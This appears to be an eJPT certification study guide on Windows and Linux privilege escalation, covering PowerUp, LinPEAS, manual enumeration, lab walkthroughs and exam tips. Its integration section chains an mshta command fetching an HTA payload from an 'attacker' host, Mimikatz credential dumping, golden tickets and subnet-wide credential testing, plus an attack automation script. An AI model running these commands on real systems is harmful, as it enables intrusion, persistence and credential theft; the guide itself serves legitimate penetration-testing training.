---
title: "Privilege Escalation - Complete Guide"
topic: "Privilege Escalation"
exam_objective: "Post-Exploitation and Privilege Escalation - eJPT Objective 5.2"
difficulty: "Medium"
tools:
  - "PowerSploit"
  - "PowerUp.ps1"
  - "LinPEAS"
  - "WinPEAS"
  - "Manual enumeration"
related_labs:
  - "07-exploitation/metasploit-essentials.md"
  - "07-exploitation/incognito-token-impersonation.md"
  - "10-post-exploitation/maintaining-access.md"
file_path: "07-exploitation/privilege-escalation.md"
last_updated: "2025-10-04"
tags:
  - "privilege-escalation"
  - "powersploit"
  - "windows-privesc"
  - "linux-privesc"
  - "post-exploitation"
---

# ðŸ”§ Privilege Escalation - Complete Guide

Comprehensive guide to privilege escalation techniques for both Windows and Linux systems, covering automated tools and manual enumeration methods essential for eJPT certification.
**Location:** `07-exploitation/privilege-escalation.md`

## ðŸŽ¯ What is Privilege Escalation?

Privilege escalation is the process of gaining elevated access rights on a system beyond what was initially obtained. This involves exploiting vulnerabilities, misconfigurations, or design flaws to gain higher-level permissions. Key approaches include:

- **Automated Vulnerability Scanning:** Using tools like PowerUp, LinPEAS, WinPEAS
- **Service Exploitation:** Exploiting vulnerable or misconfigured services
- **Credential Harvesting:** Finding stored passwords and authentication tokens
- **Token Manipulation:** Impersonating higher-privileged users (Windows)
- **SUID/SGID Exploitation:** Exploiting special permissions (Linux)

## ðŸ“¦ Installation and Setup

### Prerequisites:
- Initial system access (low-privilege shell)
- Target system enumeration completed
- Understanding of target OS architecture and version

### Tool Installation:
```bash
# Download PowerSploit (Windows privilege escalation)
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

# Download LinPEAS (Linux privilege escalation)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Download WinPEAS (Windows privilege escalation)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# Set proper permissions
chmod +x linpeas.sh
```

### Initial Configuration:
```bash
# Create privilege escalation workspace
mkdir -p ~/privesc/{windows,linux,scripts,results}
cd ~/privesc/
```

## ðŸ”§ Basic Usage and Syntax

### Basic Workflow:
1. **System Enumeration:** Collect detailed system information
2. **Vulnerability Assessment:** Identify potential privilege escalation vectors  
3. **Exploit Execution:** Execute appropriate privilege escalation technique
4. **Privilege Verification:** Confirm elevated access and persistence

### Command Structure:
```bash
# Windows PowerShell privilege escalation
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-PrivescAudit"

# Linux automated enumeration
./linpeas.sh

# Manual privilege verification
whoami /priv                    # Windows
id && sudo -l                   # Linux
```

---

## ðŸªŸ Windows Privilege Escalation

### PowerSploit Framework - Complete Guide

PowerSploit is a collection of Microsoft PowerShell modules that help penetration testers during all phases of an assessment. Think of it like a toolbox full of PowerShell scripts that can find security weaknesses in Windows systems. The PrivEsc (Privilege Escalation) module helps us go from a regular user account to administrator or SYSTEM level access.

#### What PowerSploit Does:
- **Finds Weak Services** that we can replace or modify
- **Discovers Password Files** left behind by Windows installations
- **Checks File Permissions** for writable system directories
- **Analyzes Registry Keys** for privilege escalation opportunities
- **Scans for Unquoted Paths** in Windows services
- **Identifies DLL Hijacking** opportunities for code execution

#### PowerUp.ps1 Essential Functions:
| Function | Purpose | eJPT Importance | Example |
|----------|---------|-----------------|---------|
| `Invoke-PrivescAudit` | Complete privilege escalation audit | â­â­â­â­â­ Must Know | `Invoke-PrivescAudit` |
| `Get-UnattendedInstallFile` | Find Windows installation answer files | â­â­â­â­â­ Critical | `Get-UnattendedInstallFile` |
| `Get-ModifiableService` | Find services with weak permissions | â­â­â­â­ Very Important | `Get-ModifiableService` |
| `Get-ModifiablePath` | Find writable directories in PATH | â­â­â­â­ Very Important | `Get-ModifiablePath` |
| `Get-ServiceUnquoted` | Find unquoted service paths | â­â­â­ Important | `Get-ServiceUnquoted` |
| `Get-RegistryAutoLogon` | Find autologon credentials | â­â­â­â­ Very Important | `Get-RegistryAutoLogon` |
| `Write-ServiceBinary` | Create malicious service executable | â­â­â­ Important | `Write-ServiceBinary -Name "VulnService"` |
| `Write-HijackDll` | Create DLL for hijacking attacks | â­â­â­ Important | `Write-HijackDll -DllPath "C:\temp\hijack.dll"` |

#### Manual Windows Enumeration:
```bash
# System information
systeminfo
hostname
whoami /all

# User and group enumeration
net user
net localgroup administrators
net group "Domain Admins" /domain

# Service enumeration
sc query state= all
wmic service list brief

# Registry checks for autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Scheduled tasks
schtasks /query /fo LIST /v

# Network connections
netstat -ano
```

---

## ðŸ§ Linux Privilege Escalation

### LinPEAS (Linux Privilege Escalation Awesome Script)

LinPEAS is an automated privilege escalation enumeration script for Linux systems.

#### LinPEAS Options:
| Option | Purpose | Example |
|--------|---------|---------|
| `-a` | All checks (comprehensive) | `./linpeas.sh -a` |
| `-s` | Superfast scan (quick check) | `./linpeas.sh -s` |
| `-P` | Password search in files | `./linpeas.sh -P` |
| `-o` | Only run selected checks | `./linpeas.sh -o SysI,Net` |

#### Manual Linux Enumeration:
```bash
# System information
uname -a
lsb_release -a
cat /etc/passwd
cat /etc/group

# Current user privileges
id
sudo -l
groups

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Network information
netstat -antup
ss -tulpn

# Process enumeration
ps aux
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem
```

---

## ðŸ§ª Real Lab Examples

### Example 1: Windows PowerSploit Privilege Escalation (Lab Scenario)
```bash
# Phase 1: Check current privileges
whoami
# Output: priv-esc\student

whoami /priv
# Output: Shows SeImpersonatePrivilege DISABLED

# Phase 2: Navigate to PowerSploit and load PowerUp
cd .\Desktop\PowerSploit\Privesc\
ls
# Output: Get-System.ps1, PowerUp.ps1, Privesc.psm1, README.md

# Phase 3: Execute privilege escalation audit
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit

# Output: Detailed privilege escalation vectors found
# - Unquoted service paths
# - Weak file permissions
# - Registry autoruns
```

### Example 2: Linux Manual Privilege Escalation
```bash
# Phase 1: Current user enumeration
id
# Output: uid=1000(user) gid=1000(user) groups=1000(user)

sudo -l
# Output: User may run specific commands as root

# Phase 2: SUID binary enumeration
find / -perm -4000 -type f 2>/dev/null
# Output: /usr/bin/find, /usr/bin/vim, /bin/bash

# Phase 3: Exploit SUID vim for privilege escalation
/usr/bin/vim
:set shell=/bin/bash
:shell
# Output: root shell obtained

# Verification
whoami
# Output: root
```

### Example 3: Windows Service Exploitation
```bash
# Phase 1: Service enumeration with PowerUp
Get-ServiceUnquoted
# Output: VulnService with unquoted path found

# Phase 2: Check write permissions
Get-ServiceFilePermission -Name "VulnService"
# Output: Write permissions confirmed on service directory

# Phase 3: Service exploitation
# Create malicious executable and restart service
sc stop VulnService
sc start VulnService
# Output: Service executed malicious payload with SYSTEM privileges
```

---

## ðŸŽ¯ eJPT Exam Focus

### Essential Skills for eJPT:
- **PowerSploit Usage (40%):** Master PowerUp.ps1 functions and interpretation
- **Manual Enumeration (35%):** Linux/Windows manual privilege escalation checks
- **Service Exploitation (20%):** Unquoted service paths and weak permissions
- **SUID/SGID Exploitation (5%):** Linux SUID binary privilege escalation

### Critical Commands to Master:
```bash
# PowerSploit essentials for eJPT
powershell -ep bypass                     # Bypass execution policy (100% exam usage)
. .\PowerUp.ps1                          # Load PowerSploit module (95% exam usage)
Invoke-PrivescAudit                      # Complete privilege escalation audit (90% exam usage)
Get-UnattendedInstallFile                # Find installation answer files (80% exam usage)

# Base64 credential decoding (essential skill)
$password='QWRtaW5AMTI='                 # Store encoded credential
$decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $decoded                            # Display decoded password

# Privilege escalation execution
runas.exe /user:administrator cmd        # Execute as administrator
whoami /priv                            # Check current privileges

# Linux essentials
./linpeas.sh -s                          # Quick privilege escalation scan
find / -perm -4000 -type f 2>/dev/null   # Find SUID binaries
sudo -l                                  # Check sudo permissions
crontab -l                               # Check user cron jobs
```

### eJPT Exam Scenarios:
1. **Windows Unattended File Privilege Escalation (Most Common - 60% probability)**
   - Required skills: PowerSploit usage, Base64 decoding, credential discovery
   - Expected commands: `Invoke-PrivescAudit`, `Get-UnattendedInstallFile`, Base64 decoding
   - Success criteria: Find encoded administrator credentials and escalate privileges
   - Time allocation: 8-10 minutes
   - **Step-by-step approach:**
     ```bash
     # 1. Load PowerSploit (2 minutes)
     powershell -ep bypass
     . .\PowerUp.ps1
     
     # 2. Run comprehensive audit (3 minutes)
     Invoke-PrivescAudit
     # Look for "UnattendPath" entries
     
     # 3. Extract credentials (2 minutes)
     cat C:\Windows\Panther\Unattend.xml
     # Find <Password><Value> Base64 strings
     
     # 4. Decode and escalate (3 minutes)
     $password='[base64_string]'
     $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
     runas.exe /user:administrator cmd
     ```

2. **Linux SUID Binary Exploitation**
   - Required skills: Manual enumeration, SUID exploitation
   - Expected commands: `find / -perm -4000`, binary-specific exploitation
   - Success criteria: Escalate from user to root privileges

3. **Windows Service Privilege Escalation**
   - Required skills: Service enumeration, binary replacement
   - Expected commands: `Get-ModifiableService`, `Write-ServiceBinary`
   - Success criteria: Exploit service misconfiguration for SYSTEM access

### Exam Tips and Tricks:
- **Always start with PowerSploit audit** on Windows systems - `Invoke-PrivescAudit` gives 80% of needed information
- **Master Base64 decoding** - Installation files frequently contain encoded administrator passwords
- **Check unattended files first** - Highest success rate for Windows privilege escalation
- **Verify escalated privileges immediately** with `whoami` and permission checks
- **Document findings with screenshots** for reporting requirements
- **Time management:** PowerSploit audit (3 min) â†’ Credential extraction (3 min) â†’ Escalation (2 min)
- **Know execution policy bypass by heart** - `powershell -ep bypass` is used in 95% of scenarios

### Common eJPT Questions:
- **"What PowerSploit function performs a complete privilege escalation audit?"** Answer: `Invoke-PrivescAudit`
- **"How do you decode Base64 encoded passwords in PowerShell?"** Answer: `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))`
- **"Where are Windows unattended installation files typically located?"** Answer: `C:\Windows\Panther\Unattend.xml`
- **"What Linux command finds SUID binaries with elevated permissions?"** Answer: `find / -perm -4000 -type f 2>/dev/null`
- **"How do you check current user privileges on Windows systems?"** Answer: `whoami /priv`

---

## âš ï¸ Common Issues & Troubleshooting

### Issue 1: PowerShell Execution Policy Blocked
**Problem:** PowerShell script execution blocked by execution policy
**Symptoms:** 
```bash
. : File C:\PowerUp.ps1 cannot be loaded because running scripts is disabled on this system.
```
**Cause:** Default security settings prevent PowerShell script execution
**Solution:**
```bash
# Method 1: Bypass execution policy (Most Reliable)
powershell -ep bypass
. .\PowerUp.ps1

# Method 2: Temporary policy change
Set-ExecutionPolicy Bypass -Scope CurrentUser
. .\PowerUp.ps1

# Method 3: Alternative loading method
Get-Content .\PowerUp.ps1 | Invoke-Expression

# Method 4: If all else fails
powershell -nop -ep bypass -c "IEX(Get-Content .\PowerUp.ps1 -Raw)"
```

### Issue 2: PowerSploit Functions Not Available
**Problem:** PowerSploit functions not recognized after loading
**Symptoms:**
```bash
Invoke-PrivescAudit : The term 'Invoke-PrivescAudit' is not recognized
```
**Solution:**
```bash
# Step 1: Verify PowerUp.ps1 loaded correctly
. .\PowerUp.ps1
# Should show no errors

# Step 2: Check available functions
Get-Command *Privesc*
# Should list PowerSploit functions

# Step 3: Force import if needed
Import-Module .\PowerUp.ps1 -Force

# Step 4: Alternative verification
Get-Command Invoke-PrivescAudit
```

### Issue 3: Base64 Decoding Fails
**Problem:** Base64 credential decoding throws exception
**Symptoms:**
```bash
Exception calling "FromBase64String" with "1" argument(s): "Invalid character in a Base-64 string."
```
**Solution:**
```bash
# Step 1: Clean the Base64 string
$password = $password.Trim()
$password = $password -replace "`r|`n",""

# Step 2: Verify string format
echo "Password length: $($password.Length)"
echo "Password content: $password"

# Step 3: Alternative decoding method
$bytes = [System.Convert]::FromBase64String($password)
$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
echo $decoded

# Step 4: Manual verification
# Common encoded passwords in labs:
# QWRtaW5AMTI= = Admin@123
# UGFzc3dvcmQxMjM= = Password123
```

### Issue 4: runas.exe Authentication Failure
**Problem:** runas command fails with discovered credentials
**Symptoms:**
```bash
RUNAS ERROR: Unable to run - cmd
1326: The user name or password is incorrect.
```
**Solution:**
```bash
# Step 1: Try different username formats
runas.exe /user:.\administrator cmd      # Local account format
runas.exe /user:administrator cmd        # Simple format
runas.exe /user:HOSTNAME\administrator cmd # Hostname format

# Step 2: Verify password accuracy
echo $decoded | clip                     # Copy to clipboard for manual entry

# Step 3: Alternative authentication methods
runas.exe /user:administrator /netonly cmd
# Network-only authentication

# Step 4: PowerShell credential approach
$secpass = ConvertTo-SecureString "Admin@123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("administrator", $secpass)
Start-Process cmd -Credential $cred
```

---

## ðŸ”— Integration with Other Tools

### Primary Integration: Reconnaissance â†’ PowerSploit â†’ Post-Exploitation
```bash
# Complete workflow from initial access to privilege escalation
# Phase 1: Initial reconnaissance and access
nmap -sC -sV target_ip                    # Service discovery
# Exploit vulnerable service to gain initial access

# Phase 2: PowerSploit privilege escalation
# Transfer PowerSploit to target via meterpreter, web download, or file share
upload /usr/share/powersploit/Privesc/PowerUp.ps1 C:\temp\
shell
powershell -ep bypass
cd C:\temp\
. .\PowerUp.ps1
Invoke-PrivescAudit

# Phase 3: Credential exploitation and escalation
Get-UnattendedInstallFile
# Extract and decode discovered credentials
$password='QWRtaW5AMTI='
$decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
runas.exe /user:administrator cmd

# Phase 4: Advanced post-exploitation with elevated access
# Create persistent backdoor with admin privileges
use exploit/windows/misc/hta_server
set URIPATH /admin
exploit
# Execute HTA payload as administrator for persistent access
```

### PowerSploit â†’ Metasploit â†’ Credential Harvesting Chain:
```bash
# Step 1: PowerSploit privilege escalation
Invoke-PrivescAudit
# Discover administrator credentials

# Step 2: Escalate and establish meterpreter session
# Use HTA server or other payload delivery method
msfconsole
use exploit/windows/misc/hta_server
exploit
# Execute on target as administrator: mshta.exe http://attacker:8080/payload.hta

# Step 3: Advanced credential harvesting with admin access
# In meterpreter session with admin privileges
load kiwi
creds_all                               # Extract all credentials from memory
golden_ticket_create                    # Create golden tickets if domain environment

# Step 4: Lateral movement using harvested credentials
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 192.168.1.0/24
set USERNAME administrator  
set PASSWORD Admin@123
exploit                                # Test credentials across network
```

### Complete Attack Automation Script:
```bash
#!/bin/bash
# PowerSploit-enhanced privilege escalation workflow

TARGET_IP="$1"
LHOST="$2"

echo "[+] Starting PowerSploit privilege escalation workflow"

# Phase 1: Setup HTA server for callback
echo "[+] Setting up HTA payload server"
msfconsole -x "
use exploit/windows/misc/hta_server;
set LHOST $LHOST;
set LPORT 4444;
exploit -j;
exit
" &

# Phase 2: PowerSploit commands for target execution
echo "[+] PowerSploit commands to run on target:"
echo "powershell -ep bypass"
echo '. .\PowerUp.ps1'
echo 'Invoke-PrivescAudit'
echo 'Get-UnattendedInstallFile'

# Phase 3: Common Base64 decoding for found credentials
echo "[+] Common credential decoding commands:"
echo '$password="QWRtaW5AMTI="; $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password)); echo $decoded'

# Phase 4: Privilege escalation and callback
echo "[+] After escalation, execute HTA payload:"
echo "mshta.exe http://$LHOST:8080/[generated_payload_name].hta"

echo "[+] Workflow setup complete. Execute commands on target system."
```

---

## ðŸ“ Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** Before/after privilege verification screenshots
2. **Command Outputs:** All PowerUp/LinPEAS results with timestamps
3. **Exploitation Steps:** Step-by-step commands used for escalation
4. **Impact Assessment:** What additional access was gained

### Report Template Structure:
```markdown
## Privilege Escalation Results

### Target Information
- Target: target_hostname
- Operating System: OS_version
- Initial Access Level: user_level
- Final Access Level: elevated_level

### Enumeration Results
```bash
# PowerUp audit results
Invoke-PrivescAudit output...

# LinPEAS scan results
./linpeas.sh output...
```

### Vulnerabilities Identified
1. **Unquoted Service Path:** ServiceName
   - Impact: Local privilege escalation to SYSTEM
   - Exploitation: Service restart with malicious binary

2. **SUID Binary:** /usr/bin/binary
   - Impact: Local privilege escalation to root
   - Exploitation: GTFOBins technique usage

### Recommendations
- Implement proper service path quoting
- Remove unnecessary SUID bits
- Regular privilege escalation assessments
```

### Automation Scripts:
```bash
#!/bin/bash
# Automated privilege escalation assessment script

OUTPUT_DIR="privesc_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

case "$1" in
  "windows")
    echo "[+] Windows privilege escalation assessment"
    # PowerUp execution
    powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-PrivescAudit" > "$OUTPUT_DIR/powerup_results.txt"
    
    # Manual checks
    whoami /priv > "$OUTPUT_DIR/current_privileges.txt"
    whoami /groups >> "$OUTPUT_DIR/current_privileges.txt"
    
    # Service enumeration
    sc query state= all > "$OUTPUT_DIR/services.txt"
    
    # Registry checks
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" > "$OUTPUT_DIR/autologon.txt"
    ;;
    
  "linux")
    echo "[+] Linux privilege escalation assessment"
    # LinPEAS execution
    ./linpeas.sh > "$OUTPUT_DIR/linpeas_results.txt"
    
    # Manual enumeration
    id > "$OUTPUT_DIR/current_user.txt"
    sudo -l >> "$OUTPUT_DIR/current_user.txt"
    
    # SUID binary enumeration
    find / -perm -4000 -type f 2>/dev/null > "$OUTPUT_DIR/suid_binaries.txt"
    
    # Cron job enumeration
    cat /etc/crontab > "$OUTPUT_DIR/cron_jobs.txt"
    ls -la /etc/cron* >> "$OUTPUT_DIR/cron_jobs.txt"
    ;;
esac

echo "[+] Assessment complete. Results in $OUTPUT_DIR/"
```

---

## ðŸ“š Additional Resources

### Official Documentation:
- PowerSploit GitHub repository: https://github.com/PowerShellMafia/PowerSploit
- PEASS-ng GitHub repository: https://github.com/carlospolop/PEASS-ng
- GTFOBins: https://gtfobins.github.io/

### Learning Resources:
- Windows Privilege Escalation Course: TCM Security Academy
- Linux Privilege Escalation Course: TCM Security Academy
- eJPT certification materials: INE privilege escalation modules

### Community Resources:
- HackTheBox: Privilege escalation practice machines
- TryHackMe: Windows and Linux privilege escalation rooms
- VulnHub: Downloadable VMs for offline practice

### Related Tools:
- WinPEAS: Windows privilege escalation automated scanner
- LinPEAS: Linux privilege escalation automated scanner
- JAWS: Just Another Windows (Enum) Script
- Unix-privesc-check: Unix privilege escalation checker
- BeRoot: Windows/Linux/Mac privilege escalation tool
